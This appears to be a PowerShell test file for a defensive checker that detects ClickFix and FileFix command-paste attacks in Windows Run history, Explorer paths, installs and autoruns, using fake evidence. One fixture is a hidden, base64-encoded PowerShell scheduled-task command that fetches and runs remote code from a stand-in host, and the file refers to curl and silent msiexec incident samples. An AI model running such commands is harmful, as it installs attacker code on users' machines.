# Tests for the Windows scripts. They run anywhere PowerShell runs (Windows,
# Linux or Mac), because they only test the analysis parts, with fake evidence.
#   pwsh -NoProfile -File checker/tests/Run-Tests.ps1
$ErrorActionPreference = 'Stop'
$root = Split-Path -Parent (Split-Path -Parent $PSScriptRoot)

. (Join-Path $root 'checker/Check-ClickFix.ps1')
. (Join-Path $root 'checker/Protect-RunDialog.ps1')

$script:pass = 0
$script:fail = 0
function Assert-Equal($Expected, $Actual, [string]$Name) {
    if ($Expected -eq $Actual) { $script:pass++ }
    else { $script:fail++; Write-Host ("FAIL: {0}`n      expected [{1}] got [{2}]" -f $Name, $Expected, $Actual) -ForegroundColor Red }
}

$detector = New-CfaDetector -Rules ($CfaRulesJson | ConvertFrom-Json)
$fixtures = Get-Content -Raw -Encoding UTF8 (Join-Path $root 'tests/fixtures/commands.json') | ConvertFrom-Json

# 1. Same verdicts as the JavaScript engine for every shared command.
foreach ($pair in @(@('block', $fixtures.block), @('allow', $fixtures.allow), @('hold', $fixtures.hold))) {
    foreach ($p in $pair[1].PSObject.Properties) {
        $r = Test-CfaCommand -Detector $detector -Text $p.Value
        Assert-Equal $pair[0] $r.Verdict ("{0}: {1}" -f $pair[0], $p.Name)
        if ($pair[0] -eq 'block') { Assert-Equal $true ($r.Reasons.Count -gt 0) ("block explains itself: {0}" -f $p.Name) }
    }
}

# 2. Whole-PC analysis with fake evidence.
function New-FakeEvidence {
    return [pscustomobject]@{
        Days = 30; RunMRU = @(); TypedPaths = @(); PSHistory = @(); TempFiles = @(); MsiInstalls = @(); Autoruns = @(); Errors = @()
    }
}

$clean = New-FakeEvidence
$clean.RunMRU = @('notepad', 'cmd', 'regedit', 'https://www.example.com')
$clean.PSHistory = @('Get-ChildItem', 'npm install', 'git status')
$clean.MsiInstalls = @([pscustomobject]@{ Name = 'Google Chrome'; Manufacturer = 'Google LLC'; Time = '2026-10-21 10:00' })
$clean.Autoruns = @([pscustomobject]@{ Where = 'HKCU Run'; Name = 'OneDrive'; Command = '"C:\Users\me\AppData\Local\Microsoft\OneDrive\OneDrive.exe" /background' })
$clean.TempFiles = @([pscustomobject]@{ Path = 'C:\Users\me\AppData\Local\Temp\setup.exe'; Created = '2026-10-21 10:00'; Size = 1; Signed = $true; Signer = 'Google LLC' })
$r = Invoke-CfaAnalysis -Detector $detector -Evidence $clean
Assert-Equal 'clean' $r.Overall 'clean PC is reported clean'

$hit = New-FakeEvidence
$hit.RunMRU = @('notepad', $fixtures.block.'curl + silent msiexec (incident shape)')
$r = Invoke-CfaAnalysis -Detector $detector -Evidence $hit
Assert-Equal 'danger' $r.Overall 'ClickFix command in Run history is danger'
Assert-Equal 'Run box history (Win+R)' $r.Findings[0].Area 'finding names the Run box'
Assert-Equal $true ($r.Findings[0].Item.Contains('hxxps[://]')) 'finding text is defanged'

$filefix = New-FakeEvidence
$filefix.TypedPaths = @('C:\Users\me\Documents', $fixtures.block.'FileFix disguised as a file path')
Assert-Equal 'danger' (Invoke-CfaAnalysis -Detector $detector -Evidence $filefix).Overall 'FileFix in Explorer history is danger'

$persist = New-FakeEvidence
$persist.Autoruns = @([pscustomobject]@{ Where = 'Scheduled task'; Name = '\Updater'; Command = 'powershell -w hidden -enc SQBFAFgAIAAoAGkAcgBtACAAaAB0AHQAcABzADoALwAvAGUAeABhAG0AcABsAGUA' })
Assert-Equal 'danger' (Invoke-CfaAnalysis -Detector $detector -Evidence $persist).Overall 'hidden encoded task is danger'

$msi = New-FakeEvidence
$msi.MsiInstalls = @([pscustomobject]@{ Name = 'NYcTodYVA0'; Version = '1.0.9879'; Manufacturer = 'YEfAEdSV'; Succeeded = $true; Time = '2026-10-19 21:40' })
$msi.TempFiles = @([pscustomobject]@{ Path = 'C:\Users\me\AppData\Local\Temp\S775.msi'; Created = '2026-10-19 21:39'; Size = 1; Signed = $false; Signer = '' })
$r = Invoke-CfaAnalysis -Detector $detector -Evidence $msi
Assert-Equal 'review' $r.Overall 'random-named MSI and unsigned temp file are review'
Assert-Equal 2 $r.Findings.Count 'two review findings'

# 3. Random-name helper.
Assert-Equal $true (Test-CfaRandomName 'NYcTodYVA0') 'random name detected'
Assert-Equal $false (Test-CfaRandomName 'Google Chrome') 'normal name with space'
Assert-Equal $false (Test-CfaRandomName 'GoogleChromeBeta') 'CamelCase product name'
Assert-Equal $false (Test-CfaRandomName 'Python311') 'simple name with digits'

# 4. Win+R hotkey helper: adds uppercase R and X only, never re-cases what is there.
Assert-Equal 'RX' (Get-CfaUpdatedHotkeys -Current '' -Letters @('R', 'X')) 'add to empty'
Assert-Equal 'ERX' (Get-CfaUpdatedHotkeys -Current 'E' -Letters @('R', 'X')) 'keeps existing letters'
Assert-Equal 'RX' (Get-CfaUpdatedHotkeys -Current 'RX' -Letters @('R', 'X')) 'no duplicates'
Assert-Equal $true ((Get-CfaUpdatedHotkeys -Current 'rx' -Letters @('R', 'X')) -ceq 'rxRX') 'lowercase entries are different keys and stay as they are'
Assert-Equal 'E' (Get-CfaUpdatedHotkeys -Current 'ERX' -Letters @('R', 'X') -Remove) 'fallback undo keeps other letters'
Assert-Equal '' (Get-CfaUpdatedHotkeys -Current 'RX' -Letters @('R', 'X') -Remove) 'fallback undo to empty'

# 4b. Windows Installer events are read by field number, in any Windows language.
$t = Get-Date '2026-10-19 21:40'
$ok = ConvertFrom-CfaMsiEvent -Values @('NYcTodYVA0', '1.0.9879', '1033', '0', 'YEfAEdSV') -Time $t
Assert-Equal 'NYcTodYVA0' $ok.Name 'MSI product name from field 1'
Assert-Equal 'YEfAEdSV' $ok.Manufacturer 'MSI manufacturer from field 5'
Assert-Equal $true $ok.Succeeded 'status 0 is a successful install'
$failed = ConvertFrom-CfaMsiEvent -Values @('Some App', '2.0', '1033', '1603', 'Contoso') -Time $t
Assert-Equal $false $failed.Succeeded 'status 1603 is a failed install'
$old = ConvertFrom-CfaMsiEvent -Values @('Old App', '1.0', '1033', '0') -Time $t
Assert-Equal '' $old.Manufacturer 'missing field 5 (Windows Installer 4.5 and older) is empty, not an error'

# 5. Scripts must parse cleanly and stay ASCII (Windows PowerShell 5.1 reads files as ANSI).
foreach ($f in @('checker/Check-ClickFix.ps1', 'checker/Protect-RunDialog.ps1')) {
    $path = Join-Path $root $f
    $tokens = $null; $errors = $null
    [void][System.Management.Automation.Language.Parser]::ParseFile($path, [ref]$tokens, [ref]$errors)
    Assert-Equal 0 @($errors).Count "$f parses without errors"
    $bytes = [System.IO.File]::ReadAllBytes($path)
    Assert-Equal 0 @($bytes | Where-Object { $_ -gt 127 }).Count "$f is plain ASCII"
}

Write-Host ("{0} passed, {1} failed" -f $script:pass, $script:fail)
if ($script:fail -gt 0) { exit 1 }
